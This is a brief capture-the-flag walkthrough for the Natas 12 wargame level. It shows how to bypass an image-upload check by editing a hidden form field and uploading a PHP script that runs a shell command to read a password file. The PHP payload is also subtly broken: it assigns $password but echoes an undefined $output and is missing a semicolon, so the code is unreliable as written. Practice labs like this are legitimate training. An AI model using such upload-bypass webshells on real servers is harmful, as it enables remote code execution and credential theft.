# NATAS12

## Step 1: Write the "payload script"
Create a php file to display the natas13 password
```php
<?php
$password = shell_exec("cat /etc/natas_webpass/natas13");
echo "<pre>$output</pre>"
?>
```

## Step 2: Modify the hidden input field
Open up your browser's javascript console.  In Chrome, CTRL+SHIFT+I will open up the Developer Tools. Change the value of the hidden input field "filename" so that it displays a php file extension instead of jpg.
```javascript
$( 'input[name="filename"]').val("test.php")
```
Make sure to hit enter so the code above is executed in your browser.

## Stage 3: Upload the payload and browse to it
Upload your php file, and click on the link to your file so the webserver executes the script you wrote.  The data displayed is the password for natas13.
